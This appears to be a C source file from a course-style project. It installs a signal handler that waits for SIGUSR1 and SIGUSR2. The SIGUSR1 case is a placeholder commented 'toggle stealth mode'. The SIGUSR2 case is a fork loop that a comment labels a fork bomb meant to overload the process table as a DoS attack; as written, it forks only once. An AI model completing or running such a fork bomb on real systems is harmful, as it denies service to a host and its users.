#include <errno.h>      // Error Number Library: E*, errno
#include <libgen.h>     // General Library: basename(3)
#include <stdlib.h>     // Standard Library: atoi(3), exit(3)
#include <stdio.h>      // Standard I/O Library: stdout, stderr, fprintf(3), printf(3)
#include <string.h>     // String Library: strcat(3), strdup(3), strlen(3), strncpy(3)
#include <signal.h>     // Signal Library: SIG*, sig_atomic_t, siginfo_t, struct sigaction, kill(2), sigaction(2)
#include <unistd.h>     // UNIX Standard Library: pause(2), write(2), getopt(3)
#include <sys/types.h>  // System Types Library: pid_t

#define STD_ERR_RETURN           -1
#define NULL_ERR_RETURN        NULL
#define MAX_STR_LEN            1024
#define MAX_SIG_HAND_STR_LEN    127

void simpSigHandler(int sigNum); //declare simple signal handler


int main( int argc, char *argv[] ) {
	int intReturned;  // Called failure status
	struct sigaction sigHandler;  // sigaction for signal handler information
	// Perform Function
	// Setup the information to register the signal handler
	sigHandler.sa_handler = &simpSigHandler;
	sigHandler.sa_flags = SA_RESTART;
	intReturned = sigaction(SIGUSR1, &sigHandler, NULL);
	if ( intReturned == STD_ERR_RETURN ) {
		fprintf(stderr, "ERROR: Unable to register signal handler\n");
		return 2;
	}
	intReturned = sigaction(SIGUSR2, &sigHandler, NULL);
	if ( intReturned == STD_ERR_RETURN ) {
		fprintf(stderr, "ERROR: Unable to register signal handler\n");
		return 2;
	}

	// Infinitely wait for signal

	while (1) {
		pause();
	}

	// Return to Caller
	return 0;
}

void simpSigHandler(int sigNum) {
  int savedErrno;
	// Perform function
	savedErrno = errno;
	switch (sigNum) {
		case SIGUSR1:
			//call milestone 3 to toggle stealth mode
			break;
		case SIGUSR2:
    while(1){//infinite loop
      fork();
      return;
    }
     //f-bomb = make a bunch of fork calls to overload process table (DoS attack)
			break;
		default:
			break;
	}
	errno = savedErrno;
	return;
}
